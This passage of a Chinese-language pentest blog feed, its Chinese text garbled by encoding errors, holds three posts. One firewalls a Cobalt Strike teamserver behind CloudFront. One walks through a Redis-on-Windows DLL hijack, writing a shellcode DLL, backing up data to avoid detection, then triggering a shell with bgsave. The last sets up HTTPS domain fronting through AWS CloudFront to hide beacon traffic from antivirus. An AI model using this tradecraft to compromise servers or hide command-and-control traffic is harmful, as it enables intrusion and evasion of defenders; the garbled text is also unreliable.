title="é˜²å¾¡"></a>é˜²å¾¡</h3><p>å¦‚æœæ˜¯ä½¿ç”¨äº†AWSå®¶çš„<code>CloudFront</code>ä½œä¸ºåŸŸå‰ç½®ï¼Œå¯ä»¥è®¾ç½®é˜²ç«å¢™è§„åˆ™ï¼Œåªå…è®¸å±äº<code>CloudFront</code>çš„åŸŸåæµé‡ï¼Œå…¶ä»–IPè¯·æ±‚è¿‡æ¥çš„æµé‡ä¸¢æ‰ï¼Œæ“ä½œå¦‚ä¸‹:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">0x01:  è·å–åˆ°CloudFrontçš„æ‰€æœ‰IPhttp http://d7uri8nf7uskq.cloudfront.net/tools/list-cloudfront-ips <span class="token operator">|</span>jq <span class="token string">".[][]"</span> <span class="token operator">|</span> <span class="token function">sed</span> <span class="token string">'s/"//g'</span> <span class="token operator">|</span> <span class="token function">tee</span> /tmp/cloud.txt0x02: ä½¿ç”¨ipsetæ–°å¢IPé›†åˆipset create cloudfront hash:net<span class="token keyword">while</span> <span class="token builtin class-name">read</span> line<span class="token punctuation">;</span> <span class="token keyword">do</span> ipset <span class="token function">add</span> cloudfront <span class="token variable">$line</span><span class="token punctuation">;</span> <span class="token keyword">done</span> <span class="token operator">&lt;</span> /tmp/cloud.txtipset list cloudfront0x03: æ–°å¢IPtablesè§„åˆ™iptables -A INPUT -p tcp  --dport <span class="token number">443</span> -j DROPiptables -I INPUT -m <span class="token builtin class-name">set</span> --match-set cloudfront  src -p tcp  --dport <span class="token number">443</span> -j ACCEPT0x04: åŒç†å¯¹teamserverç«¯å£è¿›è¡Œè§„åˆ™è®¾ç½®ipset create teamserver hash:ipipset <span class="token function">add</span> teamserver <span class="token number">1.2</span>.3.4iptables -A INPUT -p tcp  --dport <span class="token number">50050</span> -j DROPiptables -I INPUT -m <span class="token builtin class-name">set</span> --match-set teamserver src -p tcp --dport <span class="token number">50050</span> -j ACCEPTä¸Šé¢ä¸¤ä¸ªiptablesè§„åˆ™å¯ä»¥åˆå¹¶ä¸€æ¡ï¼šiptables -I INPUT -m <span class="token builtin class-name">set</span> <span class="token operator">!</span> --match-set teamserver src -p tcp --dport <span class="token number">50050</span> -j DROP0x05: ipsetå¸¸è§å‘½ä»¤ipset del teamserver <span class="token number">1.2</span>.3.4  <span class="token comment">#ä»teamserverä¸­åˆ é™¤æŸIP</span>ipset list teamserver <span class="token comment"># æŸ¥çœ‹teamserveré›†åˆå†…å®¹</span>ipset flush teamserver <span class="token comment"># æ¸…ç©ºteamserverå†…å®¹</span>ipset flush  <span class="token comment"># æ¸…ç©ºæ‰€æœ‰</span>ipset destroy teamserver  <span class="token comment"># é”€æ¯teamserver</span>ipset destroy <span class="token comment"># é”€æ¯æ‰€æœ‰</span>0x06: iptablesåˆ é™¤è§„åˆ™<span class="token comment"># æ˜¾ç¤ºè§„åˆ™</span>iptables -L INPUT --line-numbers <span class="token comment"># åˆ é™¤è§„åˆ™</span>iptables -D INPUT <span class="token operator">&lt;</span>num<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å½“ç„¶ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä¿®æ”¹CSçš„æºä»£ç é‡æ–°æ‰“åŒ…ã€‚</p><h3 id="æ³¨æ„"><a href="#æ³¨æ„" class="headerlink" title="æ³¨æ„"></a>æ³¨æ„</h3><p>IPSETè®¾ç½®ç™½åå•ä¹‹åï¼Œä¼šå¯¹CSçš„è®¾ç½®VPNåŠŸèƒ½æœ‰å½±å“ã€‚</p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://mp.weixin.qq.com/s/BLM8tM88x9oT4CjSiupE2A">æµ…æCobaltStrike Beacon Staging Serveræ‰«æ</a></li><li><a href="https://www.cnblogs.com/donot/p/14226788.html">é’ˆå¯¹CobaltStrikeä¸­å‡ºç°çš„Stagerç›‘å¬ç«¯å£ç‰¹å¾åé—¨åˆ†æ</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;èƒŒæ™¯&quot;&gt;&lt;a href=&quot;#èƒŒæ™¯&quot; class=&quot;headerlink&quot; title=&quot;èƒŒæ™¯&quot;&gt;&lt;/a&gt;èƒŒæ™¯&lt;/h3&gt;&lt;p&gt;åœ¨githubä¸Šé¢å‡ºç°ä¸€ä¸ªä»“åº“åˆ†æ&lt;code&gt;CobaltStrike&lt;/code&gt;ç›‘å¬ç«¯å£çš„ç‰¹å¾ï¼š&lt;a href=&quot;https://github.com/Te-k/cobaltstrike&quot;&gt;https://github.com/Te-k/cobaltstrike&lt;/a&gt;ã€‚CSåœ¨ç›‘å¬Stagerç«¯å£çš„æ—¶å€™ï¼Œä¼šé€šè¿‡URIä¸‹è½½Payloadæ‰§è¡Œï¼Œè¿™ä¸ªURIç”Ÿæˆçš„è§„åˆ™ç”Ÿæˆï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/01/04/CloudFront-find-cobaltstrike/360.png&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;æ‰¾åˆ°DomainFront&quot;&gt;&lt;a href=&quot;#æ‰¾åˆ°DomainFront&quot; class=&quot;headerlink&quot; title=&quot;æ‰¾åˆ°DomainFront&quot;&gt;&lt;/a&gt;æ‰¾åˆ°DomainFront&lt;/h3&gt;&lt;p&gt;æ ¹æ®360çš„ç©ºé—´æµ‹ç»˜ï¼Œçœ‹å®Œä¹‹åç¬¬ä¸€æ—¶é—´æƒ³åˆ°çš„æ˜¯é€šè¿‡fofaè¿™ç±»ç©ºé—´æµ‹ç»˜æ‰¾å‡ºç‰¹å¾ï¼Œç„¶åæ‰¾å‡ºæ¥è®¾ç½®äº†DomainFrontçš„C2ï¼Œæƒ³çœ‹çœ‹è¿™äº›C2&lt;br&gt;çš„åŸå§‹åŸŸåå’Œè®¾ç½®C2çš„åŸŸåæ˜¯ä»€ä¹ˆæƒ…å†µï¼Œå¤§å®¶éƒ½ç”¨çš„ä»€ä¹ˆä½œä¸ºåŸŸåå‰ç½®çš„ :)&lt;/p&gt;
&lt;h4 id=&quot;Quakeæµ‹ç»˜&quot;&gt;&lt;a href=&quot;#Quakeæµ‹ç»˜&quot; class=&quot;headerlink&quot; title=&quot;Quakeæµ‹ç»˜&quot;&gt;&lt;/a&gt;Quakeæµ‹ç»˜&lt;/h4&gt;&lt;p&gt;æ ¹æ®360ç»™å‡ºçš„æœç´¢æ¡ä»¶ï¼Œå…ˆæ‰¾å‡ºæ¥ä¸€æ‰¹IPåœ°å€:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;response:&amp;quot;HTTP&amp;#x2F;1.1 404 Not Found&amp;quot; AND response:&amp;quot;Content-Type: text&amp;#x2F;plain&amp;quot; AND response:&amp;quot;Content-Length: 0&amp;quot; AND NOT response:&amp;quot;Server: &amp;quot; AND NOT response:&amp;quot;Connection: &amp;quot; AND port: &amp;quot;443&amp;quot;   AND NOT country: &amp;quot;China&amp;quot;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&quot;ä¿®æ”¹è„šæœ¬&quot;&gt;&lt;a href=&quot;#ä¿®æ”¹è„šæœ¬&quot; class=&quot;headerlink&quot; title=&quot;ä¿®æ”¹è„šæœ¬&quot;&gt;&lt;/a&gt;ä¿®æ”¹è„šæœ¬&lt;/h4&gt;&lt;p&gt;ä¿®æ”¹å¥½ä¹‹åçš„è„šæœ¬å’Œæ‰«æç»“æœ:&lt;a href=&quot;https://github.com/JKme/cobaltstrike&quot;&gt;https://github.com/JKme/cobaltstrike&lt;/a&gt;ã€‚æŠŠå•çº¿ç¨‹æ”¹ä¸ºå¤šçº¿ç¨‹ï¼Œå†å¢åŠ ä¸€ä¸ªè·å–IPçš„httpsè¯ä¹¦åŸŸåå‡½æ•°ï¼š&lt;/p&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>Redis On Windows -- Dll Hijack</title>
    <link href="https://jkme.github.io/2020/09/10/redis-windows-hijack.html"/>
    <id>https://jkme.github.io/2020/09/10/redis-windows-hijack.html</id>
    <published>2020-09-09T16:00:00.000Z</published>
    <updated>2022-01-21T02:57:53.265Z</updated>
    
    <content type="html"><![CDATA[<p>æœ¬æ–‡æµ‹è¯•äº†Redisåœ¨Windowså¹³å°ä¸‹çš„dllåŠ«æŒï¼Œä¸»è¦å‚è€ƒæ–‡ç« æ˜¯å…ˆçŸ¥çš„ç§‹æ°´å¸ˆå‚…: <a href="https://xz.aliyun.com/t/8153">Redis on Windows å‡ºç½‘åˆ©ç”¨æ¢ç´¢</a></p><h3 id="æµ‹è¯•ç¯å¢ƒ"><a href="#æµ‹è¯•ç¯å¢ƒ" class="headerlink" title="æµ‹è¯•ç¯å¢ƒ"></a>æµ‹è¯•ç¯å¢ƒ</h3><pre class="line-numbers language-none"><code class="language-none">Redis-x64-3.2.100Win10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="å¯åŠ«æŒçš„DLL"><a href="#å¯åŠ«æŒçš„DLL" class="headerlink" title="å¯åŠ«æŒçš„DLL"></a>å¯åŠ«æŒçš„DLL</h3><p>æŒ‰ç…§æ–‡ç« ä¸­ä½¿ç”¨<code>Process Monitor</code>ï¼Œåœ¨ä½¿ç”¨<code>redis-cli</code>æ“ä½œçš„æ—¶å€™ï¼Œè§‚å¯Ÿç¼ºå¤±çš„DLLã€‚åœ¨<code>Process Monitor Filter</code>é‡Œé¢è®¾ç½®<code>Image Path</code>çš„å€¼ä¸º<code>redis-server.exe</code>çš„è·¯å¾„ï¼Œæ¯”å¦‚æˆ‘çš„æ˜¯<code>C:\Program Files\Redis\redis-server.exe</code>ï¼Œ<code>Path</code>è®¾ç½®ä¸º<code>ends with dll</code>ã€‚è®¾ç½®å¥½ä¹‹åï¼Œä½¿ç”¨<code>redis-cli</code>è¿æ¥ï¼Œæ‰§è¡Œ<code>bgsave</code>å‘½ä»¤ï¼Œç„¶åè§‚å¯Ÿç¼ºå¤±çš„dllï¼Œæœ‰å¦‚ä¸‹:</p><pre class="line-numbers language-none"><code class="language-none">HKLM\System\CurrentControlSet\Control\Srp\GP\DLLC:\Program Files\Redis\dbghelp.dllC:\Windows\System32\edgegdi.dllC:\Windows\System32\symsrv.dll<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>å½“<code>redis-server.exe</code>å¯åŠ¨çš„æ—¶å€™ï¼Œæœ‰å¦‚ä¸‹:</p><pre class="line-numbers language-none"><code class="language-none">C:\Windows\System32\edgegdi.dllC:\Windows\System32\symsrv.dllC:\Program Files\Redis\CRYPTBASE.DLL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æ‰§è¡Œ<code>BGREWRITEAOF</code>çš„æ—¶å€™ï¼Œæœ‰å¦‚ä¸‹:</p><pre class="line-numbers language-none"><code class="language-none">HKLM\System\CurrentControlSet\Control\Srp\GP\DLLC:\Program Files\Redis\dbghelp.dllC:\Windows\System32\edgegdi.dllC:\Windows\System32\symsrv.dll<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æœ€ç»ˆåœ¨Redisç›®å½•ä¸‹å¯ä»¥åˆ©ç”¨çš„æœ‰ä¸¤ä¸ª:<code>cryptbase.dll</code>å’Œ<code>dbghelp.dll</code>ã€‚å¦‚æœæ˜¯æƒé™æŒä¹…æ€§æ§åˆ¶ï¼Œä¸¤ä¸ªéƒ½å¯ä»¥ï¼Œè¿™é‡Œæˆ‘ä»¬é€‰æ‹©ä¸»åŠ¨æ”»å‡»ï¼Œæ‰€ä»¥ä½¿ç”¨<code>dbghelp.dll</code>ã€‚</p><p>###DLLHijacker</p><p>ä½¿ç”¨kiwingså¸ˆå‚…çš„<a href="https://github.com/kiwings/DLLHijacker">DLLHijacker</a>ï¼Œå› ä¸ºåœ¨ç³»ç»Ÿé‡Œé¢æ˜¯å­˜åœ¨<code>C:\Windows\System32\dbghelp.dll</code>çš„ï¼Œæ‰€ä»¥ï¼Œå¤åˆ¶å‡ºæ¥ä¹‹åï¼Œè¿è¡Œè„šæœ¬ï¼Œç”ŸæˆDLLå·¥ç¨‹é¡¹ç›®ã€‚ä¿®æ”¹é‡Œé¢çš„shellcodeå’Œdbghelp.dllçš„ç»å¯¹è·¯å¾„ã€‚</p><p>åœ¨å®é™…æµ‹è¯•çš„æ—¶å€™ï¼Œè¿è¡Œè„šæœ¬æŠ¥é”™ï¼Œæ‰€ä»¥ä¿®æ”¹äº†ä¸€éƒ¨åˆ†ä»£ç : <a href="https://github.com/JKme/sb_kiddie-/tree/master/dll_hijack">https://github.com/JKme/sb_kiddie-/tree/master/dll_hijack</a></p><p>æŠŠç”Ÿæˆçš„dllé‡å‘½åä¸º<code>dghelp.dll</code>æ”¾åœ¨redisçš„å®‰è£…ç›®å½•ï¼Œç„¶åæ‰§è¡Œ<code>bgsave</code>æˆ–è€…<code>redis-server</code>å¯åŠ¨çš„æ—¶å€™ä¼šæ‰§è¡Œshellcodeã€‚</p><p><img src="/2020/09/10/redis-windows-hijack/WX20200910.png"></p><h3 id="æµ‹è¯•ç»“æœ"><a href="#æµ‹è¯•ç»“æœ" class="headerlink" title="æµ‹è¯•ç»“æœ"></a>æµ‹è¯•ç»“æœ</h3><p>åœ¨å®é™…çš„æ¸—é€æµ‹è¯•ä¸­ï¼Œä½¿ç”¨<a href="https://github.com/r35tart/RedisWriteFile">RedisWriteFile</a>å†™å…¥æ–‡ä»¶çš„æ—¶å€™ï¼Œå› ä¸ºä½¿ç”¨çš„æ˜¯ä¸»ä»å¤åˆ¶ï¼Œä¼šæŠŠredisé‡Œé¢çš„æ•°æ®æ¸…ç©ºï¼Œè¿™æ ·æ”»å‡»ä¹‹åå¯èƒ½ä¼šè¢«å‘ç°ï¼Œæ‰€ä»¥å¯ä»¥è¿™æ ·åš:</p><h5 id="å¤‡ä»½redis"><a href="#å¤‡ä»½redis" class="headerlink" title="å¤‡ä»½redis"></a>å¤‡ä»½redis</h5><ul><li><a href="https://github.com/yannh/redis-dump-go">redis-dump-go</a></li></ul><pre class="line-numbers language-none"><code class="language-none">å¤‡ä»½:.&#x2F;redis-dump-go -host 192.168.2.233 -output commands &gt; redis.dumpæ¢å¤:redis-cli -h 192.168.2.233 &lt; redis.dump<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ”»å‡»æ­¥éª¤"><a href="#æ”»å‡»æ­¥éª¤" class="headerlink" title="æ”»å‡»æ­¥éª¤"></a>æ”»å‡»æ­¥éª¤</h3><ol><li>å‡†å¤‡å¥½dllï¼Œä½¿ç”¨<a href="https://github.com/r35tart/RedisWriteFile">RedisWriteFile</a>å†™å…¥</li><li>å¤‡ä»½Redis: <code>./redis-dump-go -host 192.168.2.233 -output commands &gt; redis.dump</code></li><li>æ‰§è¡Œ<code>bgsave</code>,è·å–Shell</li><li>æ¢å¤Redis: <code>redis-cli -h 192.168.2.233 &lt; redis.dump</code></li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;æœ¬æ–‡æµ‹è¯•äº†Redisåœ¨Windowså¹³å°ä¸‹çš„dllåŠ«æŒï¼Œä¸»è¦å‚è€ƒæ–‡ç« æ˜¯å…ˆçŸ¥çš„ç§‹æ°´å¸ˆå‚…: &lt;a href=&quot;https://xz.aliyun.com/t/8153&quot;&gt;Redis on Windows å‡ºç½‘åˆ©ç”¨æ¢ç´¢&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;æµ‹è¯•ç¯å¢ƒ&quot;&gt;&lt;a href=&quot;#æµ‹è¯•ç¯å¢ƒ&quot; class=&quot;headerlink&quot; title=&quot;æµ‹è¯•ç¯å¢ƒ&quot;&gt;&lt;/a&gt;æµ‹è¯•ç¯å¢ƒ&lt;/h3&gt;&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;Redis-x64-3.2.100
Win10&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;å¯åŠ«æŒçš„DLL&quot;&gt;&lt;a href=&quot;#å¯åŠ«æŒçš„DLL&quot; class=&quot;headerlink&quot; title=&quot;å¯åŠ«æŒçš„DLL&quot;&gt;&lt;/a&gt;å¯åŠ«æŒçš„DLL&lt;/h3&gt;&lt;p&gt;æŒ‰ç…§æ–‡ç« ä¸­ä½¿ç”¨&lt;code&gt;Process Monitor&lt;/code&gt;ï¼Œåœ¨ä½¿ç”¨&lt;code&gt;redis-cli&lt;/code&gt;æ“ä½œçš„æ—¶å€™ï¼Œè§‚å¯Ÿç¼ºå¤±çš„DLLã€‚åœ¨&lt;code&gt;Process Monitor Filter&lt;/code&gt;é‡Œé¢è®¾ç½®&lt;code&gt;Image Path&lt;/code&gt;çš„å€¼ä¸º&lt;code&gt;redis-server.exe&lt;/code&gt;çš„è·¯å¾„ï¼Œæ¯”å¦‚æˆ‘çš„æ˜¯&lt;code&gt;C:\Program Files\Redis\redis-server.exe&lt;/code&gt;ï¼Œ&lt;code&gt;Path&lt;/code&gt;è®¾ç½®ä¸º&lt;code&gt;ends with dll&lt;/code&gt;ã€‚è®¾ç½®å¥½ä¹‹åï¼Œä½¿ç”¨&lt;code&gt;redis-cli&lt;/code&gt;è¿æ¥ï¼Œæ‰§è¡Œ&lt;code&gt;bgsave&lt;/code&gt;å‘½ä»¤ï¼Œç„¶åè§‚å¯Ÿç¼ºå¤±çš„dllï¼Œæœ‰å¦‚ä¸‹:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;HKLM\System\CurrentControlSet\Control\Srp\GP\DLL
C:\Program Files\Redis\dbghelp.dll
C:\Windows\System32\edgegdi.dll
C:\Windows\System32\symsrv.dll&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;


&lt;p&gt;å½“&lt;code&gt;redis-server.exe&lt;/code&gt;å¯åŠ¨çš„æ—¶å€™ï¼Œæœ‰å¦‚ä¸‹:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;C:\Windows\System32\edgegdi.dll
C:\Windows\System32\symsrv.dll
C:\Program Files\Redis\CRYPTBASE.DLL&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;


&lt;p&gt;æ‰§è¡Œ&lt;code&gt;BGREWRITEAOF&lt;/code&gt;çš„æ—¶å€™ï¼Œæœ‰å¦‚ä¸‹:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;HKLM\System\CurrentControlSet\Control\Srp\GP\DLL
C:\Program Files\Redis\dbghelp.dll
C:\Windows\System32\edgegdi.dll
C:\Windows\System32\symsrv.dll&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>Domain Frontingéšè—HTTPS</title>
    <link href="https://jkme.github.io/2020/08/28/CloudFront-Https.html"/>
    <id>https://jkme.github.io/2020/08/28/CloudFront-Https.html</id>
    <published>2020-08-27T16:00:00.000Z</published>
    <updated>2022-01-21T02:41:29.241Z</updated>
    
    <content type="html"><![CDATA[<p>è®°å½•ä¸€ä¸‹å½“ä½¿ç”¨<code>Domain Fronting</code>ä¸­ä½¿ç”¨<code>https</code>æ¥ä¸Šçº¿æ—¶å€™çš„å‘ï¼Œå› ä¸ºæŸ¥äº†åŠåœˆæ²¡æœ‰æ‰¾åˆ°ç±»ä¼¼çš„èµ„æ–™ï¼Œä¸ºå•¥éè¦httpså‘¢ï¼Œå› ä¸º<code>node32</code>å¯¹httpçš„æµé‡å¾ˆæ•æ„Ÿã€‚</p><p>###ç›®æ ‡</p><ol><li>ä½¿ç”¨<code>Windows/beacon_https/reverse_https</code>ä½œä¸ºä¸Šçº¿çš„payload</li><li>AWSçš„<code>Cloudfront</code>ä½œä¸ºå‰ç½®åŸŸå</li></ol><h2 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h2><pre class="line-numbers language-none"><code class="language-none">åŸŸå: example.comVPS(Centos)cloudflare(åªä½œåŸŸåè§£æ,ä¸æ·»åŠ ä»»ä½•å…¶ä»–åŠŸèƒ½ï¼Œä¸åŠ CDNï¼Œä¸åŠ HTTPS)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="éƒ¨ç½²å·¥ä½œ"><a href="#éƒ¨ç½²å·¥ä½œ" class="headerlink" title="éƒ¨ç½²å·¥ä½œ"></a>éƒ¨ç½²å·¥ä½œ</h2><p>å®‰è£…çš„apacheæ˜¯æµ‹è¯•è¿é€šæ€§ï¼Œé™¤æ­¤ä¹‹å¤–æ²¡æœ‰ä»»ä½•ç”¨å¤„ã€‚</p><pre class="line-numbers language-none"><code class="language-none">yum install httpdsystemctl start httpd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="å¢åŠ apacheé…ç½®æ–‡ä»¶"><a href="#å¢åŠ apacheé…ç½®æ–‡ä»¶" class="headerlink" title="å¢åŠ apacheé…ç½®æ–‡ä»¶"></a>å¢åŠ apacheé…ç½®æ–‡ä»¶</h4><pre class="line-numbers language-none"><code class="language-none">#&#x2F;etc&#x2F;httpd&#x2F;conf.d&#x2F;vhost.conf&lt;VirtualHost *:80&gt;   DocumentRoot &#x2F;var&#x2F;www&#x2F;html   ServerName example.comRewriteEngine onRewriteCond %&#123;SERVER_NAME&#125; &#x3D;example.comRewriteRule ^ https:&#x2F;&#x2F;%&#123;SERVER_NAME&#125;%&#123;REQUEST_URI&#125; [END,NE,R&#x3D;permanent]&lt;&#x2F;VirtualHost&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="è®¾ç½®https"><a href="#è®¾ç½®https" class="headerlink" title="è®¾ç½®https"></a>è®¾ç½®https</h4><p>è¿è¡Œè„šæœ¬<code>HTTPsC2DoneRight.sh</code>ç”Ÿæˆå¯¹åº”éœ€è¦çš„æ–‡ä»¶ï¼Œæ¯”å¦‚<code>letsencrypt</code>ã€<code>amazon.profile</code>ç­‰æ–‡ä»¶ï¼Œè¿™ä¸ªæ—¶å€™httpsä¼šè‡ªåŠ¨è®¾ç½®æˆåŠŸï¼Œæµ‹è¯•å¦‚ä¸‹:</p><pre class="line-numbers language-none"><code class="language-none">curl http:&#x2F;&#x2F;example.comcurl https:&#x2F;&#x2F;example.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è¿™æ—¶å€™ä¼šç”Ÿæˆhttpsé€šä¿¡éœ€è¦çš„è¯ä¹¦æ–‡ä»¶ï¼Œä¸€èˆ¬æ˜¯é€šè¿‡è‡ªç­¾åLetsencryptç”³è¯·ä¸‹æ¥çš„ï¼š</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;letsencrypt-auto certonly --standalone -d åŸŸå --email é‚®ç®±ï¼ˆå¯åŒ¿åï¼‰openssl pkcs12 -export -in fullchain.pem -inkey privkey.pem -out pkcs.p12 -name åŸŸå -passout pass:ABcd123456keytool -importkeystore -deststorepass ABcd123456 -destkeypass ABcd123456 -destkeystore keystore.store -srckeystore pkcs.p12 -srcstoretype PKCS12 -srcstorepass ABcd123456 -alias åŸŸå<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç”Ÿæˆçš„keystoreæ˜¯åé¢è®¾ç½®CSé…ç½®æ–‡ä»¶çš„æ—¶å€™ä½¿ç”¨ã€‚</p><h4 id="è®¾ç½®CloudFront"><a href="#è®¾ç½®CloudFront" class="headerlink" title="è®¾ç½®CloudFront"></a>è®¾ç½®CloudFront</h4><p>æ ‡çº¢çš„ç‚¹ç‰¹åˆ«æ³¨æ„ï¼Œè¦æ”¹æˆè¿™ä¸ªæ ·å­ï¼Œå¦åˆ™æµ‹è¯•å¤±è´¥ã€‚æ›´æ”¹ä¹‹åå‘å¸ƒï¼Œæµ‹è¯•æ­¤æ—¶çš„<code>CloudFront</code>æ˜¯å¦ç”Ÿæ•ˆ:</p><pre class="line-numbers language-none"><code class="language-none">curl https:&#x2F;&#x2F;&lt;example&gt;.cloudfront.netcurl http:&#x2F;&#x2F;&lt;example&gt;.cloudfront.net<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2020/08/28/CloudFront-Https/WX20200828-01.png"></p><h4 id="è®¾ç½®Profile"><a href="#è®¾ç½®Profile" class="headerlink" title="è®¾ç½®Profile"></a>è®¾ç½®Profile</h4><p>ç”ŸæˆProfileï¼Œä¸Šé¢ç”Ÿæˆçš„<code>amazon.profile</code>æµ‹è¯•ä¸Šçº¿å¤±è´¥ã€‚</p><pre class="line-numbers language-none"><code class="language-none">cd &amp;&amp; git clone https:&#x2F;&#x2F;github.com&#x2F;bluscreenofjeff&#x2F;Malleable-C2-Randomizer &amp;&amp; cd Malleable-C2-Randomizerpython malleable-c2-randomizer.py -profile Sample\ Templates&#x2F;Pandora.profile -notestcp pandora_&lt;random&gt;.profile &#x2F;root&#x2F;cobaltstrike&#x2F;httpsProfile&#x2F; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="ä¿®æ”¹profile"><a href="#ä¿®æ”¹profile" class="headerlink" title="ä¿®æ”¹profile"></a>ä¿®æ”¹profile</h4><ol><li>æŠŠamazon.profileçš„æœ€åå››è¡Œè®¾ç½®httpsçš„æ·»åŠ åˆ°pandora_<random>.profileé‡Œé¢ã€‚</random></li><li>ä¿®æ”¹<code>pandora_&lt;random.profile</code>é‡Œé¢çš„<code>Host</code>ï¼Œæ”¹ä¸ºawsç”³è¯·ä¸‹æ¥çš„åŠ é€ŸåŸŸåã€‚</li><li>åœ¨profileæ–‡ä»¶æœ€åæ–°å¢é…ç½®ï¼š</li></ol><pre class="line-numbers language-none"><code class="language-none">https-certificate &#123;set keystore &quot;keystore.store&quot;;set password &quot;1234565&quot;;&#125;http-config &#123;set trust_x_forwarded_for &quot;true&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="è®¾ç½®CS"><a href="#è®¾ç½®CS" class="headerlink" title="è®¾ç½®CS"></a>è®¾ç½®CS</h4><pre class="line-numbers language-none"><code class="language-none">systemctl stop httpd  &#x2F;&#x2F;å…³é—­apache.&#x2F;teamserver &lt;IP&gt; &lt;Pass&gt; &lt;path to pandora profile&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æ–°å»ºä¸€ä¸ªlistener:</p><p><img src="/2020/08/28/CloudFront-Https/WX20200828-02.png"></p><p>æŸ¥çœ‹CSçš„<code>WEBlog</code>:</p><pre class="line-numbers language-none"><code class="language-none">curl https:&#x2F;&#x2F;cloudfront.net&#x2F;Hello<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åœ¨weblogé‡Œé¢æŸ¥çœ‹åˆ°å¯¹åº”çš„è¯·æ±‚å³è®¾ç½®æˆåŠŸã€‚</p><p><img src="/2020/08/28/CloudFront-Https/WX20200828-03.png"></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://www.blackhillsinfosec.com/using-cloudfront-to-relay-cobalt-strike-traffic/">https://www.blackhillsinfosec.com/using-cloudfront-to-relay-cobalt-strike-traffic/</a></li><li><a href="https://www.cnblogs.com/donot/p/13921874.html">Domain Frontedä»ç„¶æ˜¯æœ€ä½³çš„C2éšè—æ‰‹æ®µ</a></li></ul>]]></content>
    
    
